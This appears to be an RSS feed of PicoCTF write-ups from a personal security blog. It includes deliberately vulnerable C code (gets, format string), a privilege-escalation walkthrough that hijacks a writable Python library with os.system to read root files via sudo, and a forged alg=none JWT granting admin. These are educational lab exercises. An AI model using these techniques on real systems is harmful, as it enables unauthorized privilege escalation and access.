#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;

#define BUFSIZE 512


long get_random() {
	return rand;
}

int get_version() {
	return 2;
}

// void print(long n)
// {
// // If number is smaller than 0, put a - sign
// // and change number to positive
// if (n &amp;lt; 0) {
// putchar(&amp;#39;-&amp;#39;);
// n = -n;
// }
 
// // Remove the last digit and recur
// if (n/10)
// print(n/10);
 
// // Print the last digit
// putchar(n%10 + &amp;#39;0&amp;#39;);
// }

int do_stuff() {
	long ans = (get_random() % 4096) + 1;
	// print(ans);
	int res = 0;
	
	printf(&amp;#34;What number would you like to guess?\n&amp;#34;);
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf(&amp;#34;That&amp;#39;s not a valid number!\n&amp;#34;);
	} else {
		if (g == ans) {
			printf(&amp;#34;Congrats! You win! Your prize is this print statement!\n\n&amp;#34;);
			res = 1;
		} else {
			printf(&amp;#34;Nope!\n\n&amp;#34;);
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf(&amp;#34;New winner!\nName? &amp;#34;);
	gets(winner);
	printf(&amp;#34;Congrats: &amp;#34;);
	printf(winner);
	printf(&amp;#34;\n\n&amp;#34;);
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf(&amp;#34;Welcome to my guessing game!\n&amp;#34;);
	printf(&amp;#34;Version: %x\n\n&amp;#34;, get_version());
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - hijacking</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---hijacking/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---hijacking/</guid><description>&lt;h1 id="picoctf---hijacking">
 PicoCTF - hijacking
 &lt;a class="anchor" href="#picoctf---hijacking">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Privilege Escalation&lt;/p>
&lt;p>Hint 1: Check for Hidden files
Hint 2: No place like Home:)&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://www.runoob.com/linux/linux-comm-sudo.html">Linux sudo命令&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>-l 顯示出自己（執行 sudo 的使用者）的權限&lt;/p>&lt;/blockquote>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>第一次遇到提權的問題，感覺很新鮮也很好玩，不過因為沒啥概念所以主要是參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;/p>
&lt;ol>
&lt;li>首先觀察一下各個file或folders，根目錄有個challenge folder，另外家目錄有一個.server.py檔案，裡面的內容不太重要，只需要知道他import哪些library&lt;/li>
&lt;li>現在的問題是按照目前的權限，無法讀取challenge相關的資訊，所以我們要提升權限，主要的做法是利用base64.py這個mod全開的檔案進行讀寫，再利用python執行有import base64的.server.py檔案就可以執行shell&lt;/li>
&lt;li>為神麼要用base64.py當作主要的突破口就是因為只有他的mod全開
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ls -al /usr/lib/python3.8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rwxrwxrwx &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">20382&lt;/span> Nov &lt;span style="color:#ae81ff">14&lt;/span> &lt;span style="color:#ae81ff">2022&lt;/span> base64.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">38995&lt;/span> Nov &lt;span style="color:#ae81ff">14&lt;/span> &lt;span style="color:#ae81ff">2022&lt;/span> os.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">35243&lt;/span> Nov &lt;span style="color:#ae81ff">14&lt;/span> &lt;span style="color:#ae81ff">2022&lt;/span> socket.py
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ssh picoctf@saturn.picoctf.net -p &lt;span style="color:#ae81ff">58219&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ find / -name &lt;span style="color:#e6db74">&amp;#34;base64.py&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/lib/python3.8/base64.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ vim /usr/lib/python3.8/base64.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># add these line and save the file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>import os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>os.system&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ls -al /challenge&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo -l
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Matching Defaults entries &lt;span style="color:#66d9ef">for&lt;/span> picoctf on challenge:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> env_reset, mail_badpass,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> secure_path&lt;span style="color:#f92672">=&lt;/span>/usr/local/sbin&lt;span style="color:#ae81ff">\:&lt;/span>/usr/local/bin&lt;span style="color:#ae81ff">\:&lt;/span>/usr/sbin&lt;span style="color:#ae81ff">\:&lt;/span>/usr/bin&lt;span style="color:#ae81ff">\:&lt;/span>/sbin&lt;span style="color:#ae81ff">\:&lt;/span>/bin&lt;span style="color:#ae81ff">\:&lt;/span>/snap/bin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User picoctf may run the following commands on challenge:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>ALL&lt;span style="color:#f92672">)&lt;/span> /usr/bin/vi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>root&lt;span style="color:#f92672">)&lt;/span> NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo /usr/bin/python3 /home/picoctf/.server.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>total &lt;span style="color:#ae81ff">4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>d--------- &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">6&lt;/span> Mar &lt;span style="color:#ae81ff">16&lt;/span> 02:08 .
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drwxr-xr-x &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">51&lt;/span> Jul &lt;span style="color:#ae81ff">31&lt;/span> 15:23 ..
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">103&lt;/span> Mar &lt;span style="color:#ae81ff">16&lt;/span> 02:08 metadata.json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh: 1: ping: not found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Traceback &lt;span style="color:#f92672">(&lt;/span>most recent call last&lt;span style="color:#f92672">)&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> File &lt;span style="color:#e6db74">&amp;#34;/home/picoctf/.server.py&amp;#34;&lt;/span>, line 7, in &amp;lt;module&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> host_info &lt;span style="color:#f92672">=&lt;/span> socket.gethostbyaddr&lt;span style="color:#f92672">(&lt;/span>ip&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>socket.gaierror: &lt;span style="color:#f92672">[&lt;/span>Errno -5&lt;span style="color:#f92672">]&lt;/span> No address associated with hostname
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ vim /usr/lib/python3.8/base64.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># revise the file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>os.system&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;cat /challegne/metadata.json&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo /usr/bin/python3 /home/picoctf/.server.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;flag&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;picoctf&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;password&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;HYGhWsmPyf&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>sh: 1: ping: not found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Traceback &lt;span style="color:#f92672">(&lt;/span>most recent call last&lt;span style="color:#f92672">)&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> File &lt;span style="color:#e6db74">&amp;#34;/home/picoctf/.server.py&amp;#34;&lt;/span>, line 7, in &amp;lt;module&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> host_info &lt;span style="color:#f92672">=&lt;/span> socket.gethostbyaddr&lt;span style="color:#f92672">(&lt;/span>ip&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>socket.gaierror: &lt;span style="color:#f92672">[&lt;/span>Errno -5&lt;span style="color:#f92672">]&lt;/span> No address associated with hostname
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flag: &lt;code>picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - information</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/picoctf---information/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/picoctf---information/</guid><description>&lt;h1 id="picoctf---information">
 PicoCTF - information
 &lt;a class="anchor" href="#picoctf---information">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/186?category=4&amp;amp;page=1">https://play.picoctf.org/practice/challenge/186?category=4&amp;page=1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ubunlog.com/zh-TW/exiftool-manipula-metadatos-ubuntu/">ExifTool&lt;/a>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ exiftool cat.jpg
ExifTool Version Number : 11.88
File Name : cat.jpg
Directory : .
File Size : 858 kB
File Modification Date/Time : 2023:02:16 02:15:29+08:00
File Access Date/Time : 2023:02:16 16:09:51+08:00
File Inode Change Date/Time : 2023:02:16 12:31:32+08:00
File Permissions : rwxrwxrwx
File Type : JPEG
File Type Extension : jpg
MIME Type : image/jpeg
JFIF Version : 1.02
Resolution Unit : None
X Resolution : 1
Y Resolution : 1
Current IPTC Digest : 7a78f3d9cfb1ce42ab5a3aa30573d617
Copyright Notice : PicoCTF
Application Record Version : 4
XMP Toolkit : Image::ExifTool 10.80
License : cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9
Rights : PicoCTF
Image Width : 2560
Image Height : 1598
Encoding Process : Baseline DCT, Huffman coding
Bits Per Sample : 8
Color Components : 3
Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2)
Image Size : 2560x1598
Megapixels : 4.1
&lt;/code>&lt;/pre>&lt;p>In License row, it&amp;rsquo;s obviously a base64 encoding string
&lt;code>picoCTF{the_m3tadata_1s_modified}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Insp3ct0r</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---insp3ct0r/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---insp3ct0r/</guid><description>&lt;h1 id="picoctf---insp3ct0r">
 PicoCTF - Insp3ct0r
 &lt;a class="anchor" href="#picoctf---insp3ct0r">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://jupiter.challenges.picoctf.org:9670/">Insp3ct0r&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h2 id="exploit---browser-inspector">
 Exploit - Browser Inspector
 &lt;a class="anchor" href="#exploit---browser-inspector">#&lt;/a>
&lt;/h2>
&lt;p>HTML&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-html!" data-lang="html!">&amp;lt;!doctype html&amp;gt;
&amp;lt;html&amp;gt;
 &amp;lt;head&amp;gt;
 &amp;lt;title&amp;gt;My First Website :)&amp;lt;/title&amp;gt;
 &amp;lt;link href=&amp;#34;https://fonts.googleapis.com/css?family=Open+Sans|Roboto&amp;#34; rel=&amp;#34;stylesheet&amp;#34;&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;mycss.css&amp;#34;&amp;gt;
 &amp;lt;script type=&amp;#34;application/javascript&amp;#34; src=&amp;#34;myjs.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
 &amp;lt;/head&amp;gt;

 &amp;lt;body&amp;gt;
 &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
 &amp;lt;header&amp;gt;
	&amp;lt;h1&amp;gt;Inspect Me&amp;lt;/h1&amp;gt;
 &amp;lt;/header&amp;gt;

 &amp;lt;button class=&amp;#34;tablink&amp;#34; onclick=&amp;#34;openTab(&amp;#39;tabintro&amp;#39;, this, &amp;#39;#222&amp;#39;)&amp;#34; id=&amp;#34;defaultOpen&amp;#34;&amp;gt;What&amp;lt;/button&amp;gt;
 &amp;lt;button class=&amp;#34;tablink&amp;#34; onclick=&amp;#34;openTab(&amp;#39;tababout&amp;#39;, this, &amp;#39;#222&amp;#39;)&amp;#34;&amp;gt;How&amp;lt;/button&amp;gt;
 
 &amp;lt;div id=&amp;#34;tabintro&amp;#34; class=&amp;#34;tabcontent&amp;#34;&amp;gt;
	&amp;lt;h3&amp;gt;What&amp;lt;/h3&amp;gt;
	&amp;lt;p&amp;gt;I made a website&amp;lt;/p&amp;gt;
 &amp;lt;/div&amp;gt;

 &amp;lt;div id=&amp;#34;tababout&amp;#34; class=&amp;#34;tabcontent&amp;#34;&amp;gt;
	&amp;lt;h3&amp;gt;How&amp;lt;/h3&amp;gt;
	&amp;lt;p&amp;gt;I used these to make this site: &amp;lt;br/&amp;gt;
	 HTML &amp;lt;br/&amp;gt;
	 CSS &amp;lt;br/&amp;gt;
	 JS (JavaScript)
	&amp;lt;/p&amp;gt;
	&amp;lt;!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 --&amp;gt;
 &amp;lt;/div&amp;gt;
 
 &amp;lt;/div&amp;gt;
 
 &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>CSS
Download it and search specific string&lt;/p></description></item><item><title>PicoCTF - Investigative Reversing 0</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---investigative-reversing-0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---investigative-reversing-0/</guid><description>&lt;h1 id="picoctf---investigative-reversing-0">
 PicoCTF - Investigative Reversing 0
 &lt;a class="anchor" href="#picoctf---investigative-reversing-0">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/70?category=4&amp;amp;page=3">Investigative Reversing 0&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="http://tw.gitbook.net/c_standard_library/c_function_fputc.html">fputc() - C語言庫函數&lt;/a>
&lt;a href="https://shengyu7697.github.io/cpp-fread/">C/C++ fread 用法與範例&lt;/a>
&lt;a href="https://blog.51cto.com/u_6680689/3260951">C中fread()函数的返回值&lt;/a>
&lt;a href="https://blog.csdn.net/u010164190/article/details/124945191">C语言之1ULL/1UL/1L区别&lt;/a>&lt;/p>
&lt;h2 id="source-code---ida">
 Source code - IDA
 &lt;a class="anchor" href="#source-code---ida">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int __cdecl main(int argc, const char **argv, const char **envp)
{
 int i; // [rsp+4h] [rbp-4Ch]
 int j; // [rsp+8h] [rbp-48h]
 FILE *stream; // [rsp+10h] [rbp-40h]
 FILE *v8; // [rsp+18h] [rbp-38h]
 char ptr[40]; // [rsp+20h] [rbp-30h] BYREF
 unsigned __int64 v10; // [rsp+48h] [rbp-8h]

 v10 = __readfsqword(40u);
 stream = fopen(&amp;#34;flag.txt&amp;#34;, &amp;#34;r&amp;#34;);
 v8 = fopen(&amp;#34;mystery.png&amp;#34;, &amp;#34;a&amp;#34;);
 if ( !stream )
 puts(&amp;#34;No flag found, please make sure this is run on the server&amp;#34;);
 if ( !v8 )
 puts(&amp;#34;mystery.png is missing, please run this on the server&amp;#34;);
 if ( (int)fread(ptr, 26uLL, 1uLL, stream) &amp;lt;= 0 )
 exit(0);
 puts(&amp;#34;at insert&amp;#34;);
 fputc(ptr[0], v8);
 fputc(ptr[1], v8);
 fputc(ptr[2], v8);
 fputc(ptr[3], v8);
 fputc(ptr[4], v8);
 fputc(ptr[5], v8);
 for ( i = 6; i &amp;lt;= 14; ++i )
 fputc((char)(ptr[i] + 5), v8);
 fputc((char)(ptr[15] - 3), v8);
 for ( j = 16; j &amp;lt;= 25; ++j )
 fputc(ptr[j], v8);
 fclose(v8);
 fclose(stream);
 return __readfsqword(40u) ^ v10;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - It is my Birthday</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---it-is-my-birthday/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---it-is-my-birthday/</guid><description>&lt;h1 id="picoctf---it-is-my-birthday">
 PicoCTF - It is my Birthday
 &lt;a class="anchor" href="#picoctf---it-is-my-birthday">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/109?category=1&amp;amp;page=1">It is my Birthday&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/corkami/collisions">corkami/collisions&lt;/a>&lt;/p>
&lt;h2 id="exploit---md5-collision">
 Exploit - MD5 Collision
 &lt;a class="anchor" href="#exploit---md5-collision">#&lt;/a>
&lt;/h2>
&lt;p>Try to find different &lt;code>pdf&lt;/code> file that has same &lt;code>MD5&lt;/code> hash
Such as the example provided by &lt;code>corkami&lt;/code> - &lt;a href="https://raw.githubusercontent.com/corkami/collisions/master/examples/poeMD5_A.pdf">poeMD5_A&lt;/a> and &lt;a href="https://raw.githubusercontent.com/corkami/collisions/master/examples/poeMD5_B.pdf">poeMD5_B&lt;/a>
Note that, you must notice the file size you uploaded can not too large.&lt;/p>
&lt;h2 id="source-code---after-exploit">
 Source code - After Exploit
 &lt;a class="anchor" href="#source-code---after-exploit">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler after exploit you can get the source code &amp;amp; flag&lt;/p></description></item><item><title>PicoCTF - It's Not My Fault 1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---its-not-my-fault-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---its-not-my-fault-1/</guid><description>&lt;h1 id="picoctf---its-not-my-fault-1">
 PicoCTF - It&amp;rsquo;s Not My Fault 1
 &lt;a class="anchor" href="#picoctf---its-not-my-fault-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/python3 -u
import random
import string
import hashlib
import time

from Crypto.Util.number import inverse, getPrime, bytes_to_long, GCD
from sympy.ntheory.modular import solve_congruence

FLAG = open(&amp;#39;flag.txt&amp;#39;, &amp;#39;r&amp;#39;).read()

def CRT(a, m, b, n):
	val, mod = solve_congruence((a, m), (b, n))
	return val

def gen_key():
	while True:
		p = getPrime(512)
		q = getPrime(512)
		if GCD(p-1, q-1) == 2:
			return p, q

def get_clue(p, q, BITS):
	while True:
		d_p = random.randint(1, 1 &amp;lt;&amp;lt; BITS)
		d_q = random.randint(1, q - 1)
		if d_p % 2 == d_q % 2:
			d = CRT(d_p, p - 1, d_q, q - 1)
			e = inverse(d, (p - 1) * (q - 1))
			print(&amp;#34;Clue : &amp;#34;, e)
			return

def get_flag(p, q):
	start = time.time()
	ans = int(input())
	if (time.time() - start) &amp;gt; (15 * 60):
		print(&amp;#34;Too long!&amp;#34;)
		exit()
	else:
		if ans == p + q:
			print(FLAG)
		else:
			print(&amp;#34;oops...&amp;#34;)


#PoW

vals1 = &amp;#34;&amp;#34;.join([random.choice(string.digits) for _ in range(5)])
vals2 = &amp;#34;&amp;#34;.join([random.choice(string.hexdigits.lower()) for _ in range(6)])
user_input = input(&amp;#34;Enter a string that starts with \&amp;#34;{}\&amp;#34; (no quotes) which creates an md5 hash that ends in these six hex digits: {}\n&amp;#34;.format(vals1, vals2))
user_hash = hashlib.md5(user_input.encode()).hexdigest()

if user_input[:5] == vals1 and user_hash[-6:] == vals2:
	p, q = gen_key()
	n = p * q
	print(&amp;#34;Public Modulus : &amp;#34;, n)
	get_clue(p, q, 20)
	get_flag(p, q)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - JAUTH</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jauth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jauth/</guid><description>&lt;h1 id="picoctf---jauth">
 PicoCTF - JAUTH
 &lt;a class="anchor" href="#picoctf---jauth">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/JO7xByQgQWK67eU0goHMeA?view#c">NTUCNS - HW3 - JWT Authentication&lt;/a>&lt;/p>
&lt;h2 id="exploit---jwr--none">
 Exploit - JWR + None
 &lt;a class="anchor" href="#exploit---jwr--none">#&lt;/a>
&lt;/h2>
&lt;p>其實這一題有一點奇怪，應該說之前在解CNS作業的驗證時，TA說目前應該是不行以Alg=None的形式進行驗證的設計，我以為是後端的框架都不支援了，但應該說是不建議這樣的做法，所以這一題比想像中簡單，我還以為要把公鑰找出來，再進行sign&lt;/p>
&lt;ol>
&lt;li>用類似jwt.io的網站(&lt;a href="https://token.dev/">online tool&lt;/a>)，但支援alg=none的編碼
Payload: &lt;code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg3NzY0MjM1MTAzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwOS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzExNC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjg3NzY0MjM1fQ&lt;/code>
&lt;img src="https://hackmd.io/_uploads/B1vcsALOn.png" alt="" />&lt;/li>
&lt;/ol>
&lt;p>Flag: &lt;code>picoCTF{succ3ss_@u7h3nt1c@710n_72bf8bd5}&lt;/code>&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/njsjTVcwGwY"> picoCTF : JAUTH (Challenge 8) &lt;/a>&lt;/p></description></item><item><title>PicoCTF - Java Code Analysis!?!</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-code-analysis_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-code-analysis_/</guid><description>&lt;h1 id="picoctf---java-code-analysis">
 PicoCTF - Java Code Analysis!?!
 &lt;a class="anchor" href="#picoctf---java-code-analysis">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>JWT&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>Too Much to list&lt;/p>
&lt;h2 id="hint">
 Hint
 &lt;a class="anchor" href="#hint">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Maybe try to find the JWT Signing Key (&amp;ldquo;secret key&amp;rdquo;) in the source code? Maybe it&amp;rsquo;s hardcoded somewhere? Or maybe try to crack it?&lt;/li>
&lt;li>The &amp;lsquo;role&amp;rsquo; and &amp;lsquo;userId&amp;rsquo; fields in the JWT can be of interest to you!&lt;/li>
&lt;li>The &amp;lsquo;controllers&amp;rsquo;, &amp;lsquo;services&amp;rsquo; and &amp;lsquo;security&amp;rsquo; java packages in the given source code might need your attention. We&amp;rsquo;ve provided a README.md file that contains some documentation.&lt;/li>
